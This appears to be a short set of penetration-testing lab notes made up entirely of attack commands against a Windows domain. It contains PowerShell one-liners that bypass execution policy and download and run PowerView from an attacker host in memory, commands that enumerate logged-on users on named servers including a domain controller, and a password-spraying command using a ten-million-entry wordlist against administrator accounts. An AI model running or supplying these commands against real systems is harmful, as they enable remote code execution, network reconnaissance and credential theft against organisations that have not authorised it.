# Import PowerView Module to run further commands
powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.244/PowerView.ps1')"

powershell.exe -C "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.244:8080/PowerView.ps1'); Get-NetLoggedon -ComputerName XOR-APP59; Get-NetLoggedon -ComputerName xor-dc01;"

powershell.exe -C "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.244:8080/PowerView.ps1'); Get-NetLoggedon -ComputerName XOR-APP59;"

powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.244/PowerView.ps1', 'PowerView.ps1')


./spray-passwords.ps1 -File ./10milpasswords.txt -Admins -Verbose  